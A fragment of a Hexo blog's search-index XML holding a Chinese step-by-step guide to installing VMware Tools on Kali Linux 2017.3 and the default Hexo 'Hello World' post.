    <url>%2F2018%2F02%2F20%2Fkali2017-3%E5%AE%89%E8%A3%85vm-tools%2F</url>
    <content type="text"><![CDATA[kali 2017.3安装vm-tools1.点击虚拟机，选择安装vm-tools。 2.建立个新的目录用于挂载vm-tools。1root@kali:~# mkdir /mnt/cdrom 3.将vm-tools挂载到/mnt/cdrom/目录下。看到如图所示就表明挂载成功。12root@kali:~# mount /dev/cdrom /mnt/cdrommount: /mnt/cdrom: WARNING: device write-protected,mounted read-only. 4.切换进入/mnt/cdrom/目录。1root@kali:~# cd /mnt/cdrom/ 5.列出该目录下的文件。1root@kali:/mnt/cdrom# ls 6.进行解压，解压到/该目录下。1root@kali:/mnt/cdrom# tar zxvf VMwareTools-10.1.6-5214329.tar.gz -C / 7.此时vm-tools已经被解压了，并且生成了一个vmware-tools-distrib的文件夹。1root@kali:/mnt/cdrom# cd /vmware-tools-distrib/ 8.查看一下该目录下的文件。1root@kali:/vmware-tools-distrib# ls 9.运行该脚本（.pl是Perl脚本的后缀名）进行安装。一直回车点击确定即可。1root@kali:/vmware-tools-distrib# ./vmware-install.pl 10.如图所示就是安装成功的界面。此时我们可以执行reboot命令重启系统即可。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F02%2F18%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
